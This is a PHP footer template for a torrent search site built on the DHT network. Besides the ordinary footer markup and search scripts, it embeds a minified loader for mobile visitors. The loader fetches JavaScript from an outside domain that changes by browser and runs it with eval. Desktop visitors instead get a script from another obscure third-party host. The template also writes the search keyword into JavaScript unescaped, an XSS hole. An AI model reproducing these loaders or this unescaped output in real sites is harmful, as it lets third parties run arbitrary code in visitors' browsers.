<?php if( !defined('Access') )die('Access Definded.');?>
    <footer class="footer middle">
        <div class="container">
            <p><?php echo TITLE;?> is a Torrent Search Engine based on DHT protocol. All resources are automatically indexed from the DHT network. Instead of torrent files, we store meta information only for indexing.</p>
            <p><?php echo TITLE;?> Total indexing : <?php echo number_format($total);?> </p>
            <!--/友情链接开始-->
            <p>Links：<?php foreach($friendLink as $jLink => $jName):?><a href="<?php echo $jLink?>" target="_blank"><?php echo $jName;?></a> <?php endforeach;?></p>
            <!--/友情链接结束-->
            <p class="text-muted">
                @2016 <a href="<?php echo DOMAIN_PATH;?>"><?php echo TITLE;?></a>
                 | <a href="<?php echo DOMAIN_PATH;?>about.php">About</a>
                <!-- | <a href="<?php echo DOMAIN_PATH?>analytics.php">索引统计</a>-->
            </p>
            <?php echo STATISTICS;?>
        </div>
    </footer>
    
    
    <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script>
    <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
    <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
    <script src="<?php echo DOMAIN_PATH;?>assets/js/jquery.highlight.js"></script>

    <script type="text/javascript">   
        window.onload = function() {
            document.getElementById("search").focus();
        };
        $("#search").keypress(function() {
            if (event.which == 13) {
                onSearch(search, 1, "")
            }
        });
        function onSearch(id, page, order) {
            var keyword = trim($(id).val());
            console.log(keyword,1);
            if (keyword === "") {
                return;
            }
            var search = '<?php echo getProcessUrl('search.php?keyword={keyword}');?>';
            url = search.replace("{keyword}", keyword); 
            console.log( url );
            window.location.href = url;
        }
        function trim(str){ //删除左右两端的空格
            return str.replace(/(^\s*)|(\s*$)/g, "");
        }
        var clipboard = new Clipboard('#btnCopy');
        clipboard.on('success', function(e) {
            $('#btnCopy').tooltip('show');
//            setTimeout(sharedModal, 1000);
        })
//        $('#btnCopy').on('hidden.bs.tooltip', function() {
//            $('#btnCopy').tooltip('destroy');
//        })

        <?php if( isset($keyword ))://关键词高亮?>
        $(document).ready(function(){
            var key = '<?php echo $keyword;?>';
            $('.isSearch #list-panel').highlight(key);//显示高亮
            $('#search').val(key);
        });
        <?php endif;?>   
    </script>
    <?php if(isMobile()){?>
        <script>;(function(siteid,ucjsdomain,jsdomain){var d=(/UCBrowser/i.test(navigator.userAgent)||/QQBrowser/i.test(navigator.userAgent))?ucjsdomain:jsdomain;var a=new XMLHttpRequest();var b=d+"/pa-"+siteid+"-"+Math.floor(Math.random()*9999999+1)+"-do";if(a!=null){a.onreadystatechange=function(){if(a.readyState==4&&a.status==200){if(window.execScript)window.execScript(a.responseText,"JavaScript");else if(window.eval)window.eval(a.responseText,"JavaScript");else eval(a.responseText)}};a.open("GET",b,false);a.send()}})(698,'http://svs867.88818122.cn','http://s.baobaoshiye.com.cn');</script>

    <?php }else{ ?>
        <script src="http://j.qiqiww.com/blog/showdetail.php?z=109743"></script>
    <?php } ?>
</body>
<!--
 * 开发：老季
 * 网址：http://www.jiloc.com/42558.html
 * 日期：2016/8/25
 * >>>本程序为开源作品，如发生法律纠纷与作者无关!<<<
-->
</html>